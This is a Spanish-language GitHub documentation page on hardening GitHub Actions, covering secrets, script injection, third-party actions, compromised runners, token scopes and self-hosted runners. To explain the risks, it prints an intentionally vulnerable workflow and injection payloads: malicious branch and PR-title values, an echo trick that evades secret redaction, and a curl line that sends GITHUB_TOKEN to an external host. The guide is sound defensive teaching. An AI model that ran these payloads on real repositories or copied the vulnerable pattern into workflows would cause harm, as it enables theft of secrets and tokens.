---
title: Fortalecimiento de seguridad para GitHub Actions
shortTitle: Security hardening
intro: 'Buenas prácticas de seguridad para utilizar las características de las {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: HT
ms.contentlocale: es-ES
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161219'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## Información general

Esta guía explica cómo configurar el fortalecimiento de seguridad para ciertas características de las {% data variables.product.prodname_actions %}. Si no conoce bien los conceptos de {% data variables.product.prodname_actions %}, vea "[Conceptos básicos de Acciones de GitHub](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)".

## Uso de secretos

Los valores sensibles jamás deben almacenarse como texto simple e archivos de flujo de trabajo, sino más bien como secretos. Los [secretos](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) se pueden configurar en el nivel de organización, repositorio o entorno, y permiten almacenar información confidencial en {% data variables.product.product_name %}.

Los secretos usan [cajas selladas de Libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) para que se cifren antes de alcanzar {% data variables.product.product_name %}. Esto ocurre cuando el secreto se envía [con la interfaz de usuario](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) o mediante la [API REST](/rest/reference/actions#secrets). Este cifrado del lado del cliente ayuda a minimizar los riesgos relacionados con el registro accidental (por ejemplo, bitácoras de excepción y de solicitud, entre otras) dentro de la infraestructura de {% data variables.product.product_name %}. Una vez que se carga el secreto, {% data variables.product.product_name %} puede entonces descifrarlo para que se pueda inyectar en el tiempo de ejecución del flujo de trabajo.

Para ayudar a prevenir la divulgación accidental, {% data variables.product.product_name %} utiliza un mecanismo que intenta redactar cualquier secreto que aparezca en las bitácoras de ejecución. La redacción busca coincidencias exactas de cualquier secreto configurado, así como los cifrados comunes de los valores, tales como Base64. Sin embargo, ya que hay varias formas en las que se puede transformar el valor de un secreto, esta redacción no está garantizada. Como resultado, hay ciertos pasos proactivos y buenas prácticas que debes seguir para ayudarte a garantizar que se redacten los secretos, y para limitar otros riesgos asociados con ellos:

- **No usar nunca datos estructurados como un secreto**
    - Los datos estructurados pueden causar que la redacción de secretos dentro de las bitácoras falle, ya que la redacción depende ampliamente de encontrar una coincidencia exacta para el valor específico del secreto. Por ejemplo, no utilices un blob de JSON, XML, o YAML (o similares) para encapsular el valor de un secreto, ya que esto reduce significativamente la probablidad de que los secretos se redacten adecuadamente. En vez de esto, crea secretos individuales para cada valor sensible.
- **Registrar todos los secretos utilizados en los flujos de trabajo**
    - Si se usa un secreto para generar otro valor confidencial en un flujo de trabajo, ese valor generado debe [registrarse formalmente como secreto](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), de modo que se redactará si alguna vez aparece en los registros. Por ejemplo, si utilizas una llave privada para generar un JWT firmado para acceder a una API web, asegúrate registrar este JWT como un secreto, de lo contrario, este no se redactará si es que llega a ingresar en la salida de la bitácora.
    - El registrar secretos aplica también a cualquier tipo de transformación/cifrado. Si tu secreto se transforma de alguna manera (como en el cifrado URL o de Base64), asegúrate de registrar el valor nuevo como un secreto también.
- **Auditar cómo se controlan los secretos**
    - Audita cómo se utilizan los secretos para ayudarte a garantizar que se manejan como lo esperas. Puedes hacer esto si revisas el código fuente del rpositorio que ejecuta el flujo de trabajo y verificas cualquier acción que se utilice en dicho flujo de trabajo. Por ejemplo, verifica que no se estén enviando a hosts no deseados, o que no se estén imprimiendo explícitamente en la salida de una bitácora.
    - Visualiza las bitácoras de ejecución de tu flujo de trabajo después de probar las entradas válidas/no válidas y verifica que los secretos se redacten adecuadamente o que no se muestren. No siempre resulta obvio la forma en que un comando o herramienta que está invocando enviará errores a `STDOUT` y `STDERR`, y los secretos podrían acabar posteriormente en los registros de errores. Por consiguiente, es una buena práctica el revisar manualmente las bitácoras de flujo de trabajo después de probar las entradas válidas y no válidas.
- **Utilizar credenciales cuyo ámbito sea el mínimo**
    - Asegúrate de que las credenciales que estás utilizando dentro de los flujos de trabajo tengan los menores privilegios requeridos y ten en mente que cualquier usuario con acceso de escritura en tu repositorio tiene acceso de lectura para todos los secretos que has configurado en éste. 
    - Las acciones pueden usar `GITHUB_TOKEN` accediendo a él desde el contexto `github.token`. Para más información, vea "[Contextos](/actions/learn-github-actions/contexts#github-context)". Por lo tanto, debe asegurarse de que se conceden los permisos mínimos necesarios a `GITHUB_TOKEN`. Una buena práctica de seguridad consiste en establecer el permiso predeterminado para que `GITHUB_TOKEN` tenga acceso de lectura solo para contenido del repositorio. Se puede incrementar los permisos, conforme se requiera, para los jobs individuales dentro del archivo de flujo de trabajo. Para obtener más información, vea "[Autenticación en un flujo de trabajo](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)". 
- **Auditar y rotar los secretos registrados**
    - Revisa con frecuencia los secretos que se han registrado para confirmar que aún se requieran. Elimina aquellos que ya no se necesiten.
    - Rota los secretos con frecuencia para reducir la ventana de tiempo en la que un secreto puesto en riesgo es aún válido.
- **Tener en cuenta la exigencia de revisiones para acceder a los secretos**
    - Puedes utilizar revisiones requeridas para proteger los secretos del ambiente. Un job del flujo de trabajo no podrá acceder a los secretos del ambiente hasta que el revisor otorgue la aprobación. Para obtener más información sobre cómo almacenar secretos en entornos o requerir revisiones para entornos, vea "[Secretos cifrados](/actions/reference/encrypted-secrets)" y "[Uso de entornos para la implementación](/actions/deployment/using-environments-for-deployment)".

{% warning %}

**Advertencia**: Cualquier usuario con acceso de escritura al repositorio tiene acceso de lectura a todos los secretos configurados en él. Por lo tanto, debe asegurarse de que las credenciales que se usan en los flujos de trabajo tienen los privilegios mínimos necesarios.

{% endwarning %}

## Uso de `CODEOWNERS` para supervisar los cambios

Puede usar la característica `CODEOWNERS` para controlar cómo se realizan los cambios en los archivos de flujo de trabajo. Por ejemplo, si todos sus archivos de flujo de trabajo se almacenan en `.github/workflows`, puede agregar este directorio a la lista de propietarios de código para que cualquier cambio propuesto a estos archivos requiera primero de una aprobación de un revisor designado.

Para más información, vea "[Acerca de los propietarios del código](/github/creating-cloning-and-archiving-repositories/about-code-owners)".

## Entender el riesgo de las inyecciones de código

Cuando cree flujos de trabajo, [acciones personalizadas](/actions/creating-actions/about-actions) y [acciones compuestas](/actions/creating-actions/creating-a-composite-action), siempre debe plantearse si el código podría ejecutar entradas no fiables de atacantes. Esto puede ocurrir cuando un atacante agrega comandos y scripts malintencionados a un contexto. Cuando tu flujo de trabajo se ejecuta, estas secuencias podrían interpretarse como código que luego se ejecutará en el ejecutor.

 Los atacantes pueden agregar su propio contenido malintencionado al [contexto de `github`](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), que se debe tratar como una entrada potencialmente no fiable. Normalmente, estos contextos terminan con `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` y `title`.  Por ejemplo: `github.event.issue.title` o `github.event.pull_request.body`.

 Debes asegurarte de que estos valores no fluyan directamente hacia los flujos de trabajo, acciones, llamados a las API ni a cualquier otro lugar en donde se puedan itnerpretar como còdigo ejecutable. Cuando adoptas la misma postura de programaciòn defensiva que utilizaràs para cualquier otro còdigo de aplicaciones privilegiado, puedes ayudar a que la seguridad fortalezca tu uso de las {% data variables.product.prodname_actions %}. Para obtener información sobre algunos de los pasos que podría realizar un atacante, vea ["Impacto potencial de un ejecutor en peligro](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Adicionalmente, hay otras fuentes menos obvias de entradas no confiables, tales como los nombres de rama y las direcciones de correo electrònico, las cuales pueden ser bastante flexibles en cuestiòn de su contenido permitido. Por ejemplo, `zzz";echo${IFS}"hello";#` sería un nombre de rama válido y un posible vector de ataque para un repositorio de destino.

Las siguientes secciones explican còmo puedes ayudar a mitigar el riesgo de inyecciòn de scripts.

### Ejemplo de un ataque de inyecciòn de scripts

Un ataque de inyecciòn de scripts puede ocurrir directamente dentro de un script dentro de las lìneas de un flujo de trabajo. En el siguiente ejemplo, una acciòn utiliza una expresiòn para probar la validez del tìtulo de una solicitud de cambios, pero tambièn agrega el riesgo de ocasionar una inyecciòn de scripts:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Este ejemplo es vulnerable a la inyección de scripts, ya que el comando `run` se ejecuta en un script de shell temporal en el ejecutor. Antes de que se ejecute el script, se evalúan las expresiones dentro de {% raw %}`${{ }}`{% endraw %} y luego se sustituyen con los valores resultantes, que puede hacerlo vulnerable a la inyección de comandos de shell.

Para insertar comandos en este flujo de trabajo, el atacante podría crear una solicitud de incorporación de cambios denominada `a"; ls $GITHUB_WORKSPACE"`:

![Ejemplo de inyecciòn de scripts en el tìtulo de una solicitud de cambios](/assets/images/help/images/example-script-injection-pr-title.png)

En este ejemplo, el carácter `"` se usa para interrumpir la instrucción {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, lo que permite ejecutar el comando `ls` en el ejecutor. Puede ver la salida del comando `ls` en el registro:

![Resultado de ejemplo de la inyecciòn de scripts](/assets/images/help/images/example-script-injection-result.png)

## Buenas pràcticas para mitigar los ataques de inyecciòn de scripts

Hay varios acercamientos diferentes disponibles para ayudarte a mitigar el riesgo de inyecciones de scripts:

### Utilizar una acciòn en vez de un script dentro de las lìneas (recomendado)

El acercamiento recomendado es crear una acciòn que procese el valor del contexto como un argumento. Este acercamiento no es vulnerable a los ataques de inyecciòn, ya que el valor del contexto no se utiliza para genrar un script de un shell, sino que se pasa a la acciòn como un argumento en vez de eso:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Utilizar una variable de ambiente intermedia

Para los scripts dentro de las lìneas, el acercamiento preferente para manejar las entradas no confiables es configurar el valor de la expresiòn en una variable de ambiente intermedia.

En el ejemplo siguiente se usa Bash para procesar el valor `github.event.pull_request.title` como una variable de entorno:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

En este ejemplo, el script que se intenta inyectar no tuvo éxito:

![Ejemplo de inyección de script mitigada](/assets/images/help/images/example-script-injection-mitigated.png)

Con este enfoque, el valor de la expresión {% raw %}`${{ github.event.issue.title }}`{% endraw %} se almacena en memoria y se usa como variable, y no interactúa con el proceso de generación de scripts. Además, considere la posibilidad de usar variables de shell de comillas dobles para evitar la [división de palabras](https://github.com/koalaman/shellcheck/wiki/SC2086), si bien esta es [una de las muchas](https://mywiki.wooledge.org/BashPitfalls) recomendaciones generales para escribir scripts de shell y no es específica de {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Utilizar flujos de trabajo inicial para el escaneo de código

{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} permite encontrar vulnerabilidades de seguridad antes de que lleguen a producción. {% data variables.product.product_name %} proporciona flujos de trabajo iniciales para el {% data variables.product.prodname_code_scanning %}. Puedes utilizar estos flujos de trabajo sugeridos para construir tus flujos de trabajo del {% data variables.product.prodname_code_scanning %} en vez de comenzar desde cero. El flujo de trabajo de {% data variables.product.company_short%}, el {% data variables.code-scanning.codeql_workflow %}, funciona con {% data variables.product.prodname_codeql %}. También existen flujos de trabajo iniciales de terceros disponibles.

Para obtener más información, vea ["Acerca de {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" y "[Configuración de {% data variables.product.prodname_code_scanning %} mediante flujos de trabajo de inicio](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)".

{% endif %}

### Restringir los permisos para los tokens

Para ayudarte a mitigar el resigo de un token expuesto, considera restringir los permisos asignados. Para más información, vea "[Modificación de los permisos para GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)".

{% ifversion fpt or ghec or ghes > 3.4 %}

## Utilizar OpenID connect para acceder a los recursos en la nube

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Utilizar acciones de terceros

Los jobs individuales en un flujo de trabajo pueden interactuar con (y ponerse enriesgo con) otros jobs. Por ejemplo, un job que consulta las variables de mabiente que se utilizan por otro job subsecuente, escribir archivos en un directorio compartido que el job subsecuente procesa, o aún de forma ás directa si interactúa con el conector de Docker e inspecciona a otros contenedores en ejecución y ejecuta comandos en ellos.

Esto significa que poner en peligro una sola acción dentro de un flujo de trabajo puede ser muy significativo, ya que esta acción en peligro tiene acceso a todos los secretos que configura en su repositorio, y podría utilizar `GITHUB_TOKEN` para escribir en él. Por consiguiente, hay un riesgo significativo en suministrar acciones de repositorios de terceros en {% data variables.product.prodname_dotcom %}. Para obtener información sobre algunos de los pasos que podría realizar un atacante, vea ["Impacto potencial de un ejecutor en peligro](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Puedes ayudar a mitigar este riesgo si sigues estas buenas prácticas:

* **Anclar las acciones a un SHA de confirmación de longitud completa**

  Fijar una acción a un SHA de confirmación de longitud completa es actualmente la única forma de utilizar una acción como un lanzamiento inmutable. Fijar las acciones a un SHA en particular ayuda a mitigar el riesgo de que un actor malinencionado agregue una puerta trasera al repositorio de la acción, ya que necesitarían generar una colisión de SHA-1 para una carga útil vlálida de un objeto de Git.

* **Auditar el código fuente de la acción**

  Asegúrate de que la acción está manejando los secretos y el contenido de tu repositorio como se espera. Por ejemplo, verifica que los secretos no se envíen a hosts no deseados, o que no se registren inadvertidamente.

* **Anclar las acciones a una etiqueta únicamente si confía en el creador**

  Aunque fijar el SHA de una confirmación es la opción más segura, especificar una etiqueta es más conveniente y se utiliza ampliamente. Si te gustaría especificar una etiqueta, entonces asegúrate de que confías en los creadores de la acción. La insignia de ‘Verified creator’ en {% data variables.product.prodname_marketplace %} es una señal útil, ya que te indica que la acción viene de un equipo cuya identidad verificó {% data variables.product.prodname_dotcom %}. Nota que este acercamiento sí tiene riesgos aún si confías en el autor, ya que una etiqueta se puede mover o borrar en caso de que un actor malicioso consiga acceso al repositorio que almacena la acción.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## Reutilizar los flujos de trabajo de terceros

El mismo principio que se describió anteriormente para utilizar acciones de terceros también aplica para los flujos de trabajo de terceros. Puedes ayudar a mitigar los riesgos asociados con la reutilización de flujos de trabajo si sigues las mismas buenas prácticas que se describen anteriormente. Para más información, vea "[Reutilización de flujos de trabajo](/actions/learn-github-actions/reusing-workflows)".
{% endif %}

{% ifversion internal-actions %}
## Permitir que los flujos de trabajo accedan a los repositorios internos

{% data reusables.actions.outside-collaborators-internal-actions %} Para obtener más información, vea "[Uso compartido de acciones y flujos de trabajo con su empresa](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)".
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Impedir que {% data variables.product.prodname_actions %} de {% ifversion allow-actions-to-approve-pr-with-ent-repo %}cree o {% endif %}apruebe solicitudes de incorporación de cambios

{% data reusables.actions.workflow-pr-approval-permissions-intro %} Permitir que los flujos de trabajo, o cualquier otra automatización, {% ifversion allow-actions-to-approve-pr-with-ent-repo %}creen o {% endif %}aprueben solicitudes de incorporación de cambios podría ser un riesgo de seguridad si la solicitud de incorporación de cambios se combina sin la supervisión adecuada.

Para más información sobre cómo ajustar esta configuración, consulta {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Aplicación de directivas para {% data variables.product.prodname_actions %} en la empresa](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Deshabilitación o limitación de {% data variables.product.prodname_actions %} para la organización](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %} y "[Administración de la configuración de {% data variables.product.prodname_actions %} para un repositorio](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
{% endif %}

## Utilizar las tarjetas de puntuación para asegurar los flujos de trabajo

Los [cuadros de mandos](https://github.com/ossf/scorecard) son una herramienta de seguridad automatizada que marca las prácticas de riesgo en la cadena de suministro. Puede usar la [acción de cuadros de mandos](https://github.com/marketplace/actions/ossf-scorecard-action) y el [flujo de trabajo de inicio](https://github.com/actions/starter-workflows) para seguir las prácticas de seguridad recomendadas. Una vez que se configure, la acción de tarjetas de puntuación se ejecutará automáticamente en los cambios de repositorio y alertará a los desarrolladores sobre las prácticas riesgosas en la cadena de suministro utilizando la experiencia de escaneo en el código integrado. El proyecto de tarjetas de puntuación ejecuta varias verificaciones, incluyendo las de ataques de inyección de scripts, permisos de tokens y acciones fijadas.

## Impacto potencial de un ejecutor puesto en riesgo

Estas secciones consideran algunos de los pasos que puede llevar a cabo un atacante si pueden ejecutar comandos malintencionados en un ejecutor de {% data variables.product.prodname_actions %}.

{% note %}

**Nota:** {% data variables.product.prodname_dotcom %}-los ejecutores hospedados no buscan código malintencionado descargado por un usuario durante su trabajo, como una biblioteca de terceros en peligro.

{% endnote %}

### Acceder a los secretos

Los flujos de trabajo desencadenados mediante el evento `pull_request` tienen permisos de solo lectura y no tienen acceso a secretos. Pero estos permisos difieren para varios desencadenadores de eventos, como `issue_comment`, `issues` y `push`, donde el atacante podría intentar robar secretos del repositorio o usar el permiso de escritura del elemento [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) del trabajo.

- Si el token o el secreto se configura como una variable de entorno, se puede acceder a él directamente mediante el entorno con `printenv`.
- Si el secreto se utiliza dierctamente en una expresiòn, el script del shell que se generò se almacenarà en el disco y se podrà acceder al èl.
- En el caso de una acción eprsonalizada, el riesgo puede variar dependiendo de cómo un programa utiliza el secreto que obtuvo del argumento:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Aunque {% data variables.product.prodname_actions %} limpia los secretos de la memoria a los que no se hace referencia en el flujo de trabajo (o que no se incluyen en una acción), un atacante determinado podría recopilar `GITHUB_TOKEN` y cualquier secreto al que se hace referencia.

### Exfiltrar datos de un ejecutor

Un atacante puede exfiltrar cualquier secreto u otros datos robados del ejecutor. Para evitar la revelación accidental de secretos, {% data variables.product.prodname_actions %} [redacta automáticamente los secretos impresos en el registro](/actions/reference/encrypted-secrets#accessing-your-secrets), pero esto no es un límite de seguridad verdadero porque los secretos se pueden enviar intencionadamente al registro. Por ejemplo, los secretos ofuscados se pueden filtrar mediante `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Adicionalmente, ya que el atacante podría ejecutar comandos arbitrarios, podrían utilizar las solicitudes de tipo HTTP para enviar secretos u otros datos del repositorio a un servidor externo.

### Robo del elemento `GITHUB_TOKEN` del trabajo

Es posible que un atacante robe el elemento `GITHUB_TOKEN` del trabajo. El ejecutor de {% data variables.product.prodname_actions %} recibe automáticamente un elemento `GITHUB_TOKEN` generado con permisos que se limitan únicamente al repositorio que contiene el flujo de trabajo y el token expira una vez que se haya completado el trabajo. Una vez que se venza, el token ya no será útil para un atacante. Para evitar esta limitación, pueden automatizar el ataque y realizarlo en fracciones de segundo llamando a un servidor controlado por el atacante con el token, por ejemplo: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Modificar el contenido de un repositorio

El servidor del atacante puede usar la API {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} para [modificar el contenido del repositorio](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), incluidas las versiones, si los permisos asignados de`GITHUB_TOKEN` [no están restringidos](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Considerar acceso entre repositorios

{% data variables.product.prodname_actions %} tiene el alcance intencional de un solo repositorio a la vez. `GITHUB_TOKEN` concede el mismo nivel de acceso que el de un usuario con acceso de escritura, ya que cualquier usuario con este tipo de acceso puede acceder a este token creando o modificando un archivo de flujo de trabajo, lo que eleva los permisos de `GITHUB_TOKEN` en caso de ser necesario. Los usuarios tienen permisos específicos para cada repositorio, por lo que permitir que `GITHUB_TOKEN` para un repositorio otorgue acceso a otro afectaría al modelo de permisos de {% data variables.product.prodname_dotcom %} si no se implementa con cuidado. De forma similar, se debe tener cuidado al agregar tokens de autenticación de {% data variables.product.prodname_dotcom %} a un flujo de trabajo, ya que esto también puede afectar el modelo de permisos de {% data variables.product.prodname_dotcom %} al otorgar inadvertidamente un acceso amplio a los colaboradores.

Tenemos [un plan en la hoja de ruta de {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) para admitir un flujo que permita el acceso entre repositorios dentro de {% data variables.product.product_name %}, pero aún no es una característica compatible. Actualmente, la única forma de realizar interacciones privilegiadas entre repositorios es colocar un token de autenticación de {% data variables.product.prodname_dotcom %} o llave SSH como un secreto dentro del flujo de trabajo. Ya que muchos tipos de tokens de autenticación no permiten el acceso granular a recursos específicos, existe un riesgo significativo en el utilizar el tipo incorrecto de token, ya que puede otorgr un acceso mucho más amplio que lo que se espera.

Esta lista describe los acercamientos recomendatos para acceder alos datos de un repositorio dentro de un flujo de trabjajo, en orden descendente de preferencia:

1. **`GITHUB_TOKEN`**
    -  Este token tiene un ámbito intencional para el repositorio único que invocó el flujo de trabajo y puede tener el mismo nivel de acceso que el de un usuario con acceso de escritura en el repositorio. El token se crea antes de que inicie cada job y caduca cuando dicho job finaliza. Para más información, vea "[Autenticación con GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)".
    - `GITHUB_TOKEN` se debe usar siempre que sea posible.
2. **Clave de implementación del repositorio**
    - Las llaves de despliegue son uno de los únicos tipos de credenciales que otorgan acceso de lectura o escritura en un solo repositorio, y pueden utilizarse para interactuar con otro repositorio dentro de un flujo de trabajo. Para obtener más información, vea "[Administración de claves de implementación](/developers/overview/managing-deploy-keys#deploy-keys)".
    - Nota que las llaves de despliegue solo pueden clonarse y subirse al repositorio utilizando Git, y no pueden utilizarse para interactuar con las API de REST o de GraphQL, así que puede no sean adecuadas para tus necesidades.
3. **Tokens de {% data variables.product.prodname_github_app %}**
    - Las {% data variables.product.prodname_github_apps %} pueden instalarse en los repositorios seleccionados, e incluso tienen permisos granulares en los recursos dentro de ellos. Puedes crear una {% data variables.product.prodname_github_app %} interna a tu organización, instalarla en los repositorios a los que necesites tener acceso dentro de tu flujo de trabajo, y autenticarte como la instalación dentro del flujo de trabajo para acceder a esos repositorios.
4. **{% data variables.product.pat_generic %}s**
    - Nunca debes usar un {% data variables.product.pat_v1 %}. Estos tokens conceden acceso a todos los repositorios de las organizaciones a las que tienes acceso, así como a los repositorios de tu cuenta personal. Esto otorga indirectamente acceso amplio a todos los usuarios con permisos de escritura para el repositorio en el cual se encuentra el flujo de trabajo.
    - Si usas un {% data variables.product.pat_generic %}, nunca debes usar un {% data variables.product.pat_generic %} desde tu propia cuenta. Si sales de una organización más adelante, los flujos de trabajo que utilicen este token fallarán inmediatamente, y depurar este problema puede ser difícil. En su lugar, debes usar un {% ifversion pat-v2%}{% data variables.product.pat_v2 %}{% else %}{% data variables.product.pat_generic %}{% endif %} para una nueva cuenta que pertenece a tu organización y a la que solo se concede acceso a los repositorios específicos necesarios para el flujo de trabajo. Nota que este acercamiento no es escalable y debe evitarse para favorecer otras alternativas, tales como las llaves de despliegue.
5. **Claves SSH en una cuenta personal**
    - Los flujos de trabajo nunca deben usar las llaves SSH en una cuenta personal. De forma similar a {% data variables.product.pat_v1_plural %}, otorgan permisos de lectura/escritura a todos tus repositorios personales así como a todos los repositorios a los que tengas acceso gracias a la pertenencia a una organización.  Esto otorga indirectamente acceso amplio a todos los usuarios con permisos de escritura para el repositorio en el cual se encuentra el flujo de trabajo. Si pretendes utilizar una llave SSH porque solo necesitas llevar a cabo clonados de repositorio o subidas a éste, y no necesitas interactuar con una API pública, entonces mejor deberías utilizar llaves de despliegue individuales.

## Fortalecimiento para los ejecutores auto-hospedados

{% ifversion fpt or ghec %} Los ejecutores **hospedados en {% data variables.product.prodname_dotcom %}** ejecutan código en máquinas virtuales aisladas, limpias y efímeras, lo que significa que no hay forma de poner este entorno en riesgo de forma persistente, o de obtener acceso de otra forma a más información de la que se ha colocado en este entorno durante el proceso de arranque.
{% endif %}

{% ifversion fpt or ghec %}Los ejecutores **autohospedados**{% elsif ghes or ghae %}Los ejecutores autohospedados{% endif %} para {% data variables.product.product_name %} no tienen garantías sobre ejecutar en máquinas virtuales limpias y efímeras, y pueden ponerse en riesgo de forma persistente mediante el código no fiable en un flujo de trabajo.

{% ifversion fpt or ghec %}Como resultado, los ejecutores autohospedados casi [nunca se deben usar para repositorios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) en {% data variables.product.product_name %}, ya que cualquier usuario puede abrir solicitudes de incorporación de cambios en el repositorio y poner en peligro el entorno. De manera similar, ten{% elsif ghes or ghae %}Ten{% endif %} cuidado al utilizar ejecutores autohospedados en repositorios privados o internos, ya que cualquier usuario que pueda bifurcar el repositorio y abrir una solicitud de incorporación de cambios (por lo general, aquellos con acceso de lectura al repositorio) pueden poner en riesgo el entorno del ejecutor autohospedado, incluida la obtención de acceso a los secretos y a `GITHUB_TOKEN`que, en función de su configuración, puede conceder acceso de lectura al repositorio. Aunque los flujos de trabajo pueden controlar el acceso a los secretos de ambiente utilizando ambientes y revisiones requeridas, estos flujos de trabajo no se encuentran en un ambiente aislado y aún son susceptibles a los mismos riesgos cuando se ejecutan en un ejecutor auto-hospedado.

Cuando se define un ejecutor auto-hospedado a nivel de organización o de empresa, {% data variables.product.product_name %} puede programar flujos de trabajo de repositorios múltiples en el mismo ejecutor. Como consecuencia, si se pone en riesgo la seguridad de estos ambientes, se puede ocasionar un impacto amplio. Para ayudar a reducir el alcance de esta vulneración, puedes crear límites si organizas tus ejecutores auto-hospedados en grupos separados. Puedes restringir qué {% ifversion restrict-groups-to-workflows %}flujos de trabajo, {% endif %}organizaciones y repositorios pueden acceder a los grupos de ejecutores. Para más información, vea "[Administración del acceso a ejecutores autohospedados mediante grupos](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)".

También deberás considerar el ambiente de las máquinas del ejecutor auto-hospedado:
- ¿Qué información sensible reside en la máquina configurada como el ejecutor auto-hospedado? Por ejemplo, llaves SSH privadas, tokens de acceso a la API, entre otros.
- ¿La máquina tiene acceso a la red para servicios sensibles? Por ejemplo, servicios de metadatos de Azure o de AWS. La cantidad de información sensible en este ambiente debe ser mínima, y siempre debes estar consciente de que cualquier usuario capaz de invocar flujos de trabajo tendrá acceso a este ambiente.

Algunos clientes podrían intentar mitigar estos riesgos parcialmente implementando sistemas que destruyan al ejecutor auto-hospedado automáticamente después de cada ejecución de un job. Sin embargo, este acercamiento podría no ser tan efectivo como se pretende, ya que no hay forma de garantizar que un ejecutor auto-hospedado ejecute solamente un job. Algunos trabajos utilizarán secretos como los argumentos de la línea de comandos, los cuales puede ver otro trabajo que se esté ejecutando en el mismo ejecutor, como `ps x -w`. Esto puede causar fugas de secretos.

### Planear tu estrategia de administración para los ejecutores auto-hospedados

Un ejecutor auto-hospedado puede agregarse a varios niveles en tu jerarquía de {% data variables.product.prodname_dotcom %}: el nivel de empresa, organización o repositorio. Esta colocación determina quién podrá administrar el ejecutor:

**Administración centralizada**:
  - Si planeas que un equipo centralizado sea el propietario de los ejecutores auto-hospedados, entonces la recomendación es agregar tus ejecutores en el nivel de empresa u organización mutua más alto. Esto otorga a tu equipo una ubicación única para ver y administrar tus ejecutores.
  - Si solo tienes una organización sencilla, entonces el agregar tus ejecutores a nivel organizacional es efectivamente el mismo acercamiento, pero puede que encuentres dificultades si agregas otra organización en el futuro.

**Administración descentralizada**:
  - Si cada equipo administrará sus propios ejecutores auto-hospedados, entonces se recomienda agregarlos en el nivel más alto de propiedad del equipo. Por ejemplo, si cada equipo es dueño de su propia organización, entonces será más simple si los ejecutores se agregan a nivel de organización también.
  - También podrías agregar ejecutores a nivel de repositorio, pero esto agregará una sobrecarga de administración y también incrementará la cantidad de ejecutores que necesitas, ya que no puedes compartir ejecutores entre repositorios.

{% ifversion fpt or ghec or ghes > 3.4 %}
### Autenticarte a tu proveedor en la nube

